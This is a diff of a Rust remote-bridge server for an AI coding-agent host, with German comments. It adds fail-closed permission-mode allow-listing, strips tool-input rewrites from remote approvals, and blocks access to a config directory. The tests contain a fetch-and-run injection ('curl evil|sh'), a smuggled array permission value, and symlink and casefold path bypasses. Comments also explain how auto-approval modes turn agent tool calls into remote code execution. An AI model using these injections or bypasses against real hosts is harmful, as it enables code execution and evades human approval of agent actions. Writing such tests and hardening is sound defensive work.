@@ -58,10 +58,11 @@ const HOST_MESSAGE_TYPES: &[&str] = &[
     "start_devserver", "stop_devserver", "shutdown", "request_snapshot",
 ];
 
-/// Permission-Modi, die ein Remote-Client NICHT setzen darf: sie würden Agent-Tool-Calls
-/// automatisch freigeben — RCE-äquivalent. Höchste Sicherheitspriorität
-/// (mads-remote/docs/architecture.md §6 P0 #1).
-const FORBIDDEN_PERMISSION_MODES: &[&str] = &["bypassPermissions", "dontAsk"];
+/// Permission-Modi, die ein Remote-Client setzen DARF — ALLOW-LISTE (fail-closed): alles andere
+/// (`auto`, `acceptEdits`, `bypassPermissions`, `dontAsk` und jeder künftige Auto-Freigabe-Modus)
+/// würde Agent-Tool-Calls automatisch freigeben = stille Remote-RCE. `auto` ist bei mads GENAU der
+/// unbeaufsichtigte Ausführungsmodus (RB-AUTH-1). Eine Deny-Liste übersähe neue Modi → Allow-Liste.
+const REMOTE_ALLOWED_PERMISSION_MODES: &[&str] = &["default", "plan"];
 
 /// Validiert ein rohes WS-Text-Frame (Envelope) und gibt die KANONISCH re-serialisierte
 /// HostMessage (nur `msg`, ohne Envelope) zurück, die an den Sidecar-stdin geht. Fehler = Grund
@@ -91,13 +92,36 @@ fn validate_command_value(env: &serde_json::Value) -> Result<String, String> {
         return Err(format!("unbekannter HostMessage-Typ '{ty}'"));
     }
 
-    // permissionMode (start_agent) bzw. mode (set_permission_mode) gegen die Deny-Liste prüfen.
+    // permissionMode (start_agent) bzw. mode (set_permission_mode) gegen die ALLOW-Liste prüfen:
+    // nur `default`/`plan`; alles andere (auto/acceptEdits/bypassPermissions/dontAsk/…) ablehnen.
+    // Fail-CLOSED: ist das Feld vorhanden, aber kein String in der Allow-Liste (z. B. Array/Objekt
+    // ["bypassPermissions"], das `as_str()` durchrutschen ließe) → ablehnen. `null`/fehlend = ok
+    // (downstream Default „default").
     for field in ["permissionMode", "mode"] {
-        if let Some(v) = msg.get(field).and_then(|v| v.as_str()) {
-            if FORBIDDEN_PERMISSION_MODES.contains(&v) {
-                return Err(format!("permissionMode '{v}' von Remote nicht erlaubt (RCE-Schutz)"));
-            }
+        match msg.get(field) {
+            None => {}
+            Some(v) if v.is_null() => {}
+            Some(v) => match v.as_str() {
+                Some(s) if REMOTE_ALLOWED_PERMISSION_MODES.contains(&s) => {}
+                _ => {
+                    return Err(format!("Feld '{field}' von Remote nicht erlaubt (nur default/plan; RCE-Schutz)"));
+                }
+            },
         }
+    }
+
+    // RB-AUTH-1 (Fortsetzung): ein Remote darf einen offenen permission_request interaktiv
+    // bestätigen/ablehnen — aber NICHT über `decision.updatedInput` den Tool-Input umschreiben
+    // (= beliebige Bash injizieren) oder über `decision.remember` eine Auto-Freigabe persistieren.
+    // Sonst ist das `allow`-Feld eine Remote-RCE, die die permissionMode-Allow-Liste umgeht
+    // (adversarial verifiziert). Interaktives allow/deny bleibt; nur autoritäts-erweiternde Felder weg.
+    if ty == "answer_permission" {
+        let mut m = msg.clone();
+        if let Some(d) = m.get_mut("decision").and_then(|d| d.as_object_mut()) {
+            d.remove("updatedInput");
+            d.remove("remember");
+        }
+        return serde_json::to_string(&m).map_err(|e| e.to_string());
     }
 
     // Kanonisch re-serialisieren (nur die HostMessage) → normalisiert, kein Newline-Smuggling.
@@ -191,18 +215,38 @@ fn dispatch_file_rpc(op: &str, args: &serde_json::Value, conn_fs: &files::FsScop
     let arg = |key: &str| args.get(key).and_then(|v| v.as_str()).ok_or_else(|| format!("arg '{key}' fehlt"));
     match op {
         "register_root" => {
-            files::register_root_inner(conn_fs, arg("path")?)?;
+            // RB-FS-1/TAU-2: NUR innerhalb des host-seitig geseedeten Projekt-Scopes registrieren
+            // (nicht die permissive register_root_inner, die dem Remote beliebige Roots erlaubte).
+            files::register_root_within(conn_fs, arg("path")?)?;
             Ok(serde_json::json!({ "registered": true }))
         }
         "read_dir" => {
+            // RB-RCE-1/Read-Exfil: `.mads` über die Bridge NICHT auflisten (enthält remote-bridge/
+            // TLS-Key + devices.sqlite Auth-DB). Das Auflisten des ELTERN-Ordners zeigt nur den Namen
+            // `.mads` (harmlos); hier wird das Betreten von `.mads` selbst geblockt.
+            if files::path_in_mads_dir(arg("path")?) {
+                return Err("Das .mads-Verzeichnis ist über die Bridge nicht zugänglich".into());
+            }
             let nodes = files::read_dir_inner(conn_fs, arg("path")?)?;
             serde_json::to_value(nodes).map_err(|e| e.to_string())
         }
         "read_file" => {
+            // Read-Exfil: kein Remote-Lesen von `.mads` (TLS-Server-Privatkey `remote-bridge/
+            // key.pk8.der` → Impersonation, `devices.sqlite` → Token-Diebstahl).
+            if files::path_in_mads_dir(arg("path")?) {
+                return Err("Das .mads-Verzeichnis ist über die Bridge nicht zugänglich".into());
+            }
             let fr = files::read_file_inner(conn_fs, arg("path")?)?;
             serde_json::to_value(fr).map_err(|e| e.to_string())
         }
         "write_file" => {
+            // RB-RCE-1: ein Remote darf NICHT ins `.mads`-Verzeichnis schreiben — `run.json` führt der
+            // Dev-Server als Shell aus (RCE), agents.json/Registry sind Host-State. Das ganze Verzeichnis
+            // sperren (nicht nur das Leaf) UND über den kanonisierten Pfad prüfen macht den APFS-
+            // Unicode-Casefold-/Symlink-Bypass gegenstandslos. Der lokale Editor bleibt unberührt.
+            if files::path_in_mads_dir(arg("path")?) {
+                return Err("Schreiben ins .mads-Verzeichnis ist über die Bridge nicht erlaubt".into());
+            }
             // Optimistic-Concurrency: base{MtimeMs,Size,Hash} werden mitgeschickt; write_file_inner
             // liefert `saved{…}` oder `conflict`, wenn die Datei sich seit dem Laden geändert hat.
             let content = args.get("content").and_then(|v| v.as_str()).ok_or("arg 'content' fehlt")?;
@@ -446,7 +490,10 @@ pub async fn start(tee: broadcast::Sender<String>, forward: CommandSink, auth: A
     // einen toten ephemeren zu laufen (→ 60-s-Timeout hinter der macOS-Stealth-Firewall, die kein
     // RST schickt). Ist der Wunschport belegt, fällt `bind_and_serve` auf ephemer zurück.
     let desired_port = read_persisted_port(&cert_dir);
-    let (port, accept) = bind_and_serve(tls_config, tee, forward, auth, desired_port).await?;
+    // repoRoot aus cert_dir (= <repoRoot>/.mads/remote-bridge) ableiten → damit wird der
+    // File-RPC-Scope jeder Verbindung host-seitig aufs Projekt begrenzt (RB-FS-1).
+    let repo_root = cert_dir.parent().and_then(|p| p.parent()).map(|p| p.to_path_buf());
+    let (port, accept) = bind_and_serve(tls_config, tee, forward, auth, desired_port, repo_root).await?;
     persist_port(&cert_dir, port);
     let mdns = advertise(port, &spki_fp_hex, &project)?;
 
@@ -470,7 +517,7 @@ fn persist_port(dir: &Path, port: u16) {
 /// Testbarer Kern OHNE mDNS: auf allen Interfaces binden (der iPad im LAN muss uns erreichen;
 /// ephemerer Port = Multi-Instanz-freundlich), Accept-Loop spawnen. Gibt (Port, Accept-Handle)
 /// zurück.
-async fn bind_and_serve(tls_config: Arc<ServerConfig>, tee: broadcast::Sender<String>, forward: CommandSink, auth: Arc<AuthState>, desired_port: u16) -> BridgeResult<(u16, tokio::task::JoinHandle<()>)> {
+async fn bind_and_serve(tls_config: Arc<ServerConfig>, tee: broadcast::Sender<String>, forward: CommandSink, auth: Arc<AuthState>, desired_port: u16, repo_root: Option<PathBuf>) -> BridgeResult<(u16, tokio::task::JoinHandle<()>)> {
     let listener = if desired_port != 0 {
         match TcpListener::bind((Ipv4Addr::UNSPECIFIED, desired_port)).await {
             Ok(l) => l,
@@ -481,7 +528,7 @@ async fn bind_and_serve(tls_config: Arc<ServerConfig>, tee: broadcast::Sender<St
     };
     let port = listener.local_addr()?.port();
     let acceptor = TlsAcceptor::from(tls_config);
-    let accept = tokio::spawn(accept_loop(listener, acceptor, tee, forward, auth));
+    let accept = tokio::spawn(accept_loop(listener, acceptor, tee, forward, auth, repo_root));
     Ok((port, accept))
 }
 
@@ -609,7 +656,7 @@ fn advertise(port: u16, fp_hex: &str, project: &str) -> BridgeResult<mdns_sd::Se
 
 // ─────────────────────────────────────────────────────────────── Accept-Loop
 
-async fn accept_loop(listener: TcpListener, acceptor: TlsAcceptor, tee: broadcast::Sender<String>, forward: CommandSink, auth: Arc<AuthState>) {
+async fn accept_loop(listener: TcpListener, acceptor: TlsAcceptor, tee: broadcast::Sender<String>, forward: CommandSink, auth: Arc<AuthState>, repo_root: Option<PathBuf>) {
     loop {
         let (tcp, peer) = match listener.accept().await {
             Ok(v) => v,
@@ -623,8 +670,9 @@ async fn accept_loop(listener: TcpListener, acceptor: TlsAcceptor, tee: broadcas
         let acceptor = acceptor.clone();
         let forward = forward.clone();
         let auth = auth.clone();
+        let repo_root = repo_root.clone();
         tokio::spawn(async move {
-            if let Err(e) = handle_conn(tcp, acceptor, rx, forward, auth).await {
+            if let Err(e) = handle_conn(tcp, acceptor, rx, forward, auth, repo_root).await {
                 eprintln!("[mads:bridge] Verbindung {peer} beendet: {e}");
             }
         });
@@ -638,7 +686,7 @@ async fn accept_loop(listener: TcpListener, acceptor: TlsAcceptor, tee: broadcas
 ///
 /// P0.3 hat NOCH keine Auth (kommt P1.2, hinter dem MADS_REMOTE_BRIDGE-Gate); ein verbundener
 /// Client darf also bereits Befehle senden — außer den per Deny-Liste gesperrten permissionMode.
-async fn handle_conn(tcp: TcpStream, acceptor: TlsAcceptor, mut rx: broadcast::Receiver<String>, forward: CommandSink, auth: Arc<AuthState>) -> BridgeResult<()> {
+async fn handle_conn(tcp: TcpStream, acceptor: TlsAcceptor, mut rx: broadcast::Receiver<String>, forward: CommandSink, auth: Arc<AuthState>, repo_root: Option<PathBuf>) -> BridgeResult<()> {
     let tls = acceptor.accept(tcp).await?;
 
     // Anti-CSWSH: ein nativer Client sendet KEINEN Origin-Header; ein Browser schon → ablehnen.
@@ -655,9 +703,12 @@ async fn handle_conn(tcp: TcpStream, acceptor: TlsAcceptor, mut rx: broadcast::R
     let ws = accept_hdr_async(tls, origin_guard).await?;
     let (mut sink, mut source) = ws.split();
 
-    // PRO-VERBINDUNGS-Scope (§9.5): startet leer, wird nur durch `register_root` dieser Verbindung
-    // gefüllt und verschwindet beim Disconnect. Kein anderer Socket sieht diese Roots.
+    // PRO-VERBINDUNGS-Scope (§9.5): verschwindet beim Disconnect, kein anderer Socket sieht ihn.
+    // RB-FS-1/TAU-2: host-seitig aufs AUTORITATIVE Projekt geseedet (repoRoot + ~/mads-worktrees) —
+    // ein Remote kann per `register_root` nur INNERHALB davon (register_root_within), nicht darüber
+    // hinaus (~/Library, ~/.ssh, /Volumes …). Der Peer wählt keine beliebigen Roots mehr.
     let conn_fs = files::FsScope::default();
+    files::seed_bridge_scope(&conn_fs, repo_root.as_deref());
     // Auth-Zustand DIESER Verbindung: None bis `pair`/`auth` erfolgreich (dann die deviceId).
     // Vor Auth wird der Event-Tee NICHT ausgeliefert und command/file-rpc abgelehnt.
     let mut authed: Option<String> = None;
@@ -839,7 +890,7 @@ mod tests {
     async fn tee_reaches_tls_ws_client() {
         let auth = test_auth();
         let (tee, _keep) = broadcast::channel::<String>(64);
-        let (port, accept) = bind_and_serve(test_config(), tee.clone(), noop_sink(), auth.clone(), 0).await.expect("bind_and_serve");
+        let (port, accept) = bind_and_serve(test_config(), tee.clone(), noop_sink(), auth.clone(), 0, None).await.expect("bind_and_serve");
 
         let ws = connect_and_pair(port, &auth).await;
         let (mut _sink, mut source) = ws.split();
@@ -871,7 +922,7 @@ mod tests {
         let (tee, _keep) = broadcast::channel::<String>(64);
         let (fwd_tx, mut fwd_rx) = tokio::sync::mpsc::unbounded_channel::<String>();
         let forward: CommandSink = Arc::new(move |line: &str| fwd_tx.send(line.to_string()).map_err(|e| e.to_string()));
-        let (port, accept) = bind_and_serve(test_config(), tee, forward, auth.clone(), 0).await.expect("bind_and_serve");
+        let (port, accept) = bind_and_serve(test_config(), tee, forward, auth.clone(), 0, None).await.expect("bind_and_serve");
 
         let ws = connect_and_pair(port, &auth).await;
         let (mut sink, mut _source) = ws.split();
@@ -901,7 +952,7 @@ mod tests {
         let (tee, _keep) = broadcast::channel::<String>(64);
         let (fwd_tx, mut fwd_rx) = tokio::sync::mpsc::unbounded_channel::<String>();
         let forward: CommandSink = Arc::new(move |line: &str| fwd_tx.send(line.to_string()).map_err(|e| e.to_string()));
-        let (port, accept) = bind_and_serve(test_config(), tee, forward, auth, 0).await.expect("bind_and_serve");
+        let (port, accept) = bind_and_serve(test_config(), tee, forward, auth, 0, None).await.expect("bind_and_serve");
 
         let mut ws = connect_ws_client(port).await; // NICHT gepaart
         ws.send(Message::text(r#"{"channel":"command","msg":{"type":"poll_project"}}"#)).await.unwrap();
@@ -955,9 +1006,43 @@ mod tests {
     }
 
     #[test]
+    fn validate_rejects_auto_and_accept_edits_modes() {
+        // RB-AUTH-1: `auto` (unbeaufsichtigte Ausführung) und `acceptEdits` (Auto-Datei-Writes)
+        // müssen von der Allow-Liste geblockt werden — nicht nur bypassPermissions/dontAsk.
+        for m in ["auto", "acceptEdits"] {
+            let f = format!(r#"{{"channel":"command","msg":{{"type":"set_permission_mode","agentId":"a","mode":"{m}"}}}}"#);
+            assert!(validate_command(&f).is_err(), "mode '{m}' hätte abgelehnt werden müssen");
+            let g = format!(r#"{{"channel":"command","msg":{{"type":"start_agent","agentId":"a","prompt":"p","permissionMode":"{m}"}}}}"#);
+            assert!(validate_command(&g).is_err(), "permissionMode '{m}' hätte abgelehnt werden müssen");
+        }
+    }
+
+    #[test]
     fn validate_allows_safe_permission_mode() {
-        let f = r#"{"channel":"command","msg":{"type":"start_agent","agentId":"a","prompt":"p","permissionMode":"default"}}"#;
-        assert!(validate_command(f).is_ok());
+        for m in ["default", "plan"] {
+            let f = format!(r#"{{"channel":"command","msg":{{"type":"start_agent","agentId":"a","prompt":"p","permissionMode":"{m}"}}}}"#);
+            assert!(validate_command(&f).is_ok(), "mode '{m}' hätte erlaubt sein müssen");
+        }
+    }
+
+    #[test]
+    fn validate_rejects_non_string_permission_mode() {
+        // Fail-closed: ein Array-Wert darf `as_str()` nicht durchrutschen (sonst ungeprüft an stdin).
+        let f = r#"{"channel":"command","msg":{"type":"start_agent","agentId":"a","prompt":"p","permissionMode":["bypassPermissions"]}}"#;
+        assert!(validate_command(f).is_err(), "non-string permissionMode muss abgelehnt werden");
+    }
+
+    #[test]
+    fn validate_strips_updated_input_and_remember_from_answer_permission() {
+        // RB-AUTH-1: ein Remote-`allow` darf weder den Tool-Input umschreiben (updatedInput =
+        // Bash-Injection) noch eine Auto-Freigabe persistieren (remember). Beide Felder müssen aus
+        // dem kanonischen Output verschwinden; interaktives allow bleibt gültig.
+        let f = r#"{"channel":"command","msg":{"type":"answer_permission","agentId":"a","requestId":"r","decision":{"behavior":"allow","updatedInput":{"command":"curl evil|sh"},"remember":true}}}"#;
+        let out = validate_command(f).expect("answer_permission bleibt gültig");
+        assert!(!out.contains("updatedInput"), "updatedInput muss entfernt sein: {out}");
+        assert!(!out.contains("remember"), "remember muss entfernt sein: {out}");
+        assert!(!out.contains("curl evil"), "injizierter Befehl muss weg sein: {out}");
+        assert!(out.contains(r#""behavior":"allow""#), "das allow selbst bleibt erhalten: {out}");
     }
 
     #[test]
@@ -996,22 +1081,23 @@ mod tests {
     }
 
     #[test]
-    fn file_rpc_register_then_read_dir_in_scope() {
-        // Das Crate-Verzeichnis ist ein echter, valider, registrierbarer Root (kein Deny/System).
+    fn file_rpc_register_within_scope_ok_outside_rejected() {
+        // Der Host seedet den Per-Connection-Scope aufs Projekt (RB-FS-1) — der Remote wählt NICHT
+        // selbst beliebige Roots. Hier: das Crate-Verzeichnis als „Projekt".
         let root = env!("CARGO_MANIFEST_DIR");
         let fs = files::FsScope::default();
+        files::seed_bridge_scope(&fs, Some(std::path::Path::new(root)));
 
-        // (1) read_dir VOR register_root → Fehler (leerer Scope = §9.5-Default).
-        let pre = file_rpc_reply(&serde_json::json!({"id":"0","op":"read_dir","args":{"path":root}}), &fs);
-        assert!(pre.contains(r#""ok":false"#), "{pre}");
-
-        // (2) register_root → ok.
+        // register_root INNERHALB des geseedeten Scopes → ok; read_dir sieht Cargo.toml.
         let reg = file_rpc_reply(&serde_json::json!({"id":"1","op":"register_root","args":{"path":root}}), &fs);
         assert!(reg.contains(r#""ok":true"#), "{reg}");
-
-        // (3) read_dir → jetzt in-scope, sieht Cargo.toml.
         let ls = file_rpc_reply(&serde_json::json!({"id":"2","op":"read_dir","args":{"path":root}}), &fs);
         assert!(ls.contains(r#""ok":true"#) && ls.contains("Cargo.toml"), "{ls}");
+
+        // register_root AUSSERHALB (Projekt-Parent) → abgelehnt (Confinement RB-FS-1/TAU-2).
+        let outside = std::path::Path::new(root).parent().unwrap().to_string_lossy().to_string();
+        let bad = file_rpc_reply(&serde_json::json!({"id":"3","op":"register_root","args":{"path":outside}}), &fs);
+        assert!(bad.contains(r#""ok":false"#), "Root ausserhalb des Projekts muss abgelehnt werden: {bad}");
     }
 
     #[test]
@@ -1022,6 +1108,7 @@ mod tests {
         let _ = std::fs::remove_file(&path);
 
         let fs = files::FsScope::default();
+        files::seed_bridge_scope(&fs, Some(dir));
         let reg = file_rpc_reply(&serde_json::json!({"id":"1","op":"register_root","args":{"path": dir.to_string_lossy()}}), &fs);
         assert!(reg.contains(r#""ok":true"#), "{reg}");
 
@@ -1038,6 +1125,56 @@ mod tests {
         assert!(c.contains(r#""kind":"conflict""#), "{c}");
 
         let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn file_rpc_write_into_mads_dir_is_rejected() {
+        // RB-RCE-1: ein Remote darf NICHT ins .mads-Verzeichnis schreiben (run.json = Dev-Server-
+        // Shell-Exec). Das GANZE Verzeichnis ist gesperrt, und die Prüfung läuft über den
+        // KANONISIERTEN Pfad → robust gegen APFS-Unicode-Casefold und Symlinks (nicht nur String).
+        let base = std::env::temp_dir().join(format!("mads-madsdeny-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&base);
+        std::fs::create_dir_all(base.join(".mads")).expect("mkdir .mads");
+        let fs = files::FsScope::default();
+        files::seed_bridge_scope(&fs, Some(&base));
+
+        let deny = |p: std::path::PathBuf| -> bool {
+            file_rpc_reply(&serde_json::json!({"id":"m","op":"write_file","args":{
+                "path": p.to_string_lossy(), "content": "{}", "baseMtimeMs": 0, "baseSize": 0, "baseHash": ""
+            }}), &fs).contains(r#""ok":false"#)
+        };
+
+        // (a) ASCII-Varianten des Verzeichnisses (Roh-Check).
+        for madsdir in [".mads", ".MADS", ".Mads"] {
+            assert!(deny(base.join(madsdir).join("run.json")), "{madsdir}/run.json muss abgelehnt werden");
+        }
+        // (b) Symlink ins echte .mads → canonicalize löst auf → abgelehnt (volume-unabhängig).
+        let link = base.join("lnk");
+        std::os::unix::fs::symlink(base.join(".mads"), &link).expect("symlink");
+        assert!(deny(link.join("run.json")), "Schreiben durch einen Symlink ins .mads muss abgelehnt werden");
+        // (c) Unicode-Casefold des Verzeichnisses (`.mad\u{017f}` → `.mads`): nur asserten, wenn das
+        // Test-Volume tatsächlich faltet (case-insensitives APFS tut das) — sonst ist es harmlos.
+        let uni = base.join(".mad\u{017f}");
+        if std::fs::canonicalize(&uni).map(|c| c.ends_with(".mads")).unwrap_or(false) {
+            assert!(deny(uni.join("run.json")), "Unicode-Casefold `.mad\u{017f}` → `.mads` muss abgelehnt werden");
+        }
+        // (d) Kontrolle: eine normale Projektdatei (kein .mads) wird gespeichert.
+        let ok = file_rpc_reply(&serde_json::json!({"id":"ok","op":"write_file","args":{
+            "path": base.join("ok.txt").to_string_lossy(), "content": "hi", "baseMtimeMs": 0, "baseSize": 0, "baseHash": ""
+        }}), &fs);
+        assert!(ok.contains(r#""kind":"saved""#), "normale Datei muss gespeichert werden: {ok}");
+
+        // (e) Read-Exfil: read_dir/read_file ins .mads sind ebenfalls gesperrt (TLS-Key/Auth-DB),
+        // das Auflisten des Projekt-ROOTS bleibt aber erlaubt.
+        std::fs::write(base.join(".mads").join("run.json"), "{}").expect("seed .mads/run.json");
+        let rd = file_rpc_reply(&serde_json::json!({"id":"rd","op":"read_dir","args":{"path": base.join(".mads").to_string_lossy()}}), &fs);
+        assert!(rd.contains(r#""ok":false"#), "read_dir von .mads muss abgelehnt werden: {rd}");
+        let rf = file_rpc_reply(&serde_json::json!({"id":"rf","op":"read_file","args":{"path": base.join(".mads").join("run.json").to_string_lossy()}}), &fs);
+        assert!(rf.contains(r#""ok":false"#), "read_file in .mads muss abgelehnt werden: {rf}");
+        let root_ls = file_rpc_reply(&serde_json::json!({"id":"root","op":"read_dir","args":{"path": base.to_string_lossy()}}), &fs);
+        assert!(root_ls.contains(r#""ok":true"#), "read_dir des Projekt-Roots muss erlaubt bleiben: {root_ls}");
+
+        let _ = std::fs::remove_dir_all(&base);
     }
 
     /// mDNS-Advertise startet ohne Fehler und registriert den Service. Multicast ist in manchen
